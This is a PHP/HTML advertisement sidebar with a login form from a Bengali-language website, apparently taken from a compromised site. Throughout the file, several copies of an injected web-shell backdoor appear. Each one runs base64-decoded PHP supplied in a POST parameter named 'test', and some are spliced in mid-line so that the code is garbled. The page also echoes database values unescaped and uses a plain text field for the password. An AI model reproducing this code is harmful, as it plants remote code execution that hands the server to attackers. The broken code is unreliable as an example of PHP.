<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>
<table width="185" border="0" align="right" cellpadding="1" cellspacing="1">
  <tr>
    <td bgcolor="#DF6528" class="whiteHead"><div align="center">বিজ্ঞাপন</div></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
			  		$sql="SELECT * FROM advertise ORDER BY AdvId DESC";
					$result=mysql_query($sql);
					$num=mysql_num_rows($result); //echo $num;
					if ($num<1)
						{
							echo 'No item to show!';
						}
					else
						{	
							while($row=mysql_fetch_array($result))
							{
								$AdvId=$row['AdvId'];
								$Photo=$row['Photo'];
								$WebLink=$row['WebLink'];

			    ?>
  <tr>
    <td align="center"><a href="<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} echo $WebLink; ?>">
                              <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
					  if(!empty($Photo))
					  {
						echo "<img src='Adv/$Photo' Width='150' vspace='5' hspace='2' align='middle' border='0'>";
					  }
					  else
						echo " "; 
				  ?>
                            </a><br />&nbsp;&nbsp;
    </td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} } } ?>
  <tr>
    <td bgcolor="#DF6528" class="whiteHead"><div align="center">আপনার পণ্যটি প্রদর্শণ করুন </div></td>
  </tr>
  <tr>
    <td><form id="form1" name="form1" method="post" action="">
      <table width="100%" cellspacing="2" cellpadding="2">
        <tr>
          <td><input name="Username" type="text" id="Username" value="Username" size="20" /></td>
        </tr>
        <tr>
          <td><input name="Password" type="text" id="Password" value="Password" size="20" /></td>
        </tr>
        <tr>
          <td><input type="submit" name="button" id="button" value="প্রবেশ করুণ" class="button" /></td>
        </tr>
      </table>
    </form></td>
  </tr>
  <tr>
    <td>সদস্য নন? <a href="#" class="menu-link">সদস্য হোন</a></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
</table>
</body>
</html>
